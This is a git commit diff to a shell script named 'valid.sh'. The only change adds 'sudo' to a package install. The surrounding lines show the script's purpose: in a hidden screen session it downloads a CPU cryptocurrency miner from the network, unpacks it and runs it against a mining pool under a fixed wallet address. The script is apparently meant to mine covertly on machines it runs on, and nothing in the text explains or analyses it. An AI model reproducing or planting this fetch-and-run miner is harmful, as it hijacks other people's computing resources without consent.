4d80b045db921d9142f7c4f10cd7df8aed7d7ff9
squibex <90225595+squibex@users.noreply.github.com>
2021-11-23 17:22:48 -0800

    Update valid.sh

--- valid.sh
+++ valid.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-apt-get install -y screen < "/dev/null"
+sudo apt-get install -y screen < "/dev/null"
 
 screen -S "layar" -d -m
 screen -r "layar" -X stuff $'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.worke -p x --cpu 2\n'
